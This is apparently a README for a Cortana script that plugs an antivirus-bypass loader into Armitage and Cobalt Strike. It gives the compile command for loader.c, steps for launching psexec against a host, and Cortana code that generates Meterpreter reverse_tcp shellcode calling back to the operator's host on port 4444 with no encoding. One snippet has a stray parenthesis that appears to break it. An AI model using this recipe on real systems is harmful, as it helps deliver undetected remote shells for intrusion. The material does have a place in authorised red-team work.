This Cortana script demonstrates how to hook an AV-bypass technology into
Armitage and Cobalt Strike's workflow. This is a pretty trivial example,
but I hope it helps get the point across. :)

loader.c was taken from: 
https://github.com/rsmudge/metasploit-loader

to compile it (on Linux):

i586-mingw32msvc-gcc loader.c -o loader.exe -lws2_32 -mwindows

To use:

1. Navigate to Armitage -> Scripts
2. Press Load
3. Select av-bypass.cna (it doesn't matter where you put it)

*Congrats, the script is loaded*

4. Try psexec against a host.
	Use [host] -> Login -> psexec
	Or, launch psexec from module browser.
5. Make sure you opt to use a reverse payload!

This example does not require generating shellcode to create a custom EXE.
In most cases, this is something you're going to want.

	local('$options $shellcode');
	$options = %(
			LHOST      => lhost(), 
			LPORT      => 4444, 
			PAYLOAD    => "windows/meterpreter/reverse_tcp"),
			EXITFUNC   => "process",
			Encoder    => "generic/none",
			Iterations => 0);

	$shellcode = call("module.execute", "payload", $options['PAYLOAD'], $options)['payload'];

You can use Cortana's &generate call as well. I think it's:

	$shellcode = generate("windows/meterpreter/reverse_tcp", lhost(), 4444, %(), "raw");

It all depends on your tolerance for magic.

-- Raphael
